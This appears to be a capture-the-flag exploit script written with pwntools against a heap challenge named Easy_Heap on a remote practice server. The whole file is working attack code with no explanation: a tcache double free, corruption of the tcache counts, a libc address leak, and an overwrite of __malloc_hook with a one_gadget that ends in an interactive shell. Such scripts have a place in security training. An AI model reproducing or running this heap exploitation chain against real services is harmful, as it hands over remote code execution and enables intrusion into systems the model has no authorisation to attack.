#BY FMYY
from pwn import*
def add(size):	#7
	p.sendlineafter('choice: ','1')
	p.sendlineafter('size?',str(size))
def edit(index,content):
	p.sendlineafter('choice: ','2')
	p.sendlineafter('idx?',str(index))
	p.sendafter('content:',content)
def show(index):
	p.sendlineafter('choice: ','3')
	p.sendlineafter('idx?',str(index))
def free(index):		#3
	p.sendlineafter('choice: ','4')
	p.sendlineafter('idx?',str(index))
	
libc = ELF('./libc-2.27.so',checksec=False)
#context.log_level = 'debug'
while True:
	p  = remote('node3.buuoj.cn',27061)
	#p = process('./Easy_Heap')
	try:
		add(0x50)#0
		free(0)
		free(0)
		add(0x50)#1
		edit(1,p16(0xA010))
		add(0x50)#2
		add(0x50)#3 #tcache_count
		edit(3,'\xFF'*0x38) #modify tcache_count >7
		free(3)
		show(3)
		libc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x60 - 0x10 - libc.sym['__malloc_hook']
		malloc_hook = libc_base + libc.sym['__malloc_hook']
		realloc = libc_base + 0x98C39
		og = [0x4F2C5,0x4F322,0x10A38C]
		one_gadget = libc_base + og[1]
		add(0x50) #4 ->tcache_struct
		payload = '\x00'*0x48 + p64(malloc_hook-0x13)
		edit(4,payload)
		add(0x20)
		edit(5,'\x00'*(0x13-8) + p64(one_gadget) + p64(realloc)) 
		add(0x10)
		break
	except:
		p.close()
p.interactive()
